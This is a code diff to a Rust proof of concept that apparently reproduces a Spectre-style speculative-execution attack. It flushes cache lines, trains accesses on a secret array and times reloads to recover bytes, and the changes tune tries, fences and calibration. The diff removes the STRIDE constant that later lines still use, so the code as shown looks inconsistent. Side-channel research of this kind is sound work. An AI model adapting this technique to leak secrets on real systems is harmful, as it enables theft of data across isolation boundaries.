@@ -29,7 +29,6 @@ const THRESHOLD: u64 = 80;
 #[cfg(all(target_arch = "wasm32"))]
 const THRESHOLD: u64 = 470;
 */
-const STRIDE: usize = 512;
 
 const data_size: usize = 11;
 static mut public_data: [u8; 160] = [2; 160];
@@ -63,16 +62,20 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         eprint!("latencies = [")
     }*/
     // Get the TRIES from env
-    let tries = std::env::var("TRIES").unwrap_or("1000".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("5000".to_string());
     let tries = tries.parse::<u64>().unwrap();
+    unsafe {
+        _mm_mfence();
+    }
+
     for i in 0..tries {
-        /*#[cfg(feature = "tracing")]
-        {
-            eprint!("[");
-        }*/
         // flush lines clflush
         // PRIME
         for j in 0..256 {
+            unsafe {
+                _mm_mfence();
+            }
+
             #[cfg(all(target_arch = "x86_64"))]
             unsafe {
                 _mm_clflush(&array_for_prediction[j * STRIDE] as *const u8);
@@ -83,12 +86,12 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
             }
         }
         // Wait a little to the cache to flush
-        for _ in 0..1000 {}
+        //for _ in 0..100 {}
         unsafe {
             _mm_mfence();
         }
 
-        // Set the cache
+        // Train the access?
         for j in 0..100 {
             unsafe {
                 let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
@@ -139,11 +142,11 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         value[0] = max1 as u64;
         value[1] = max2 as u64;
 
-        /*if scores[max1 as usize] > 2 * scores[max2 as usize] {
+        if scores[max1 as usize] > 2 * scores[max2 as usize] {
             #[cfg(feature = "tracing")]
             println!("Breaking");
             break;
-        }*/
+        }
     }
 
     #[cfg(feature = "tracing")]
@@ -189,9 +192,13 @@ pub fn main() {
         public_data[15] = 16;
     }
 
-    let (cache_hit, cache_miss) = reproduction::get_cache_time(&array_for_prediction);
-    println!("cache_hit = {}, cache_miss = {}", cache_hit, cache_miss);
     for j in 0..11 {
+        let (cache_hit, cache_miss) = reproduction::get_cache_time(&array_for_prediction);
+        unsafe {
+            _mm_mfence();
+        }
+        // println!("cache_hit = {}, cache_miss = {}", cache_hit, cache_miss);
+
         let (score, value) = read_memory_byte(j, cache_hit, cache_miss);
         // get value 0 as char
         let ch = value[0] as u8 as char;
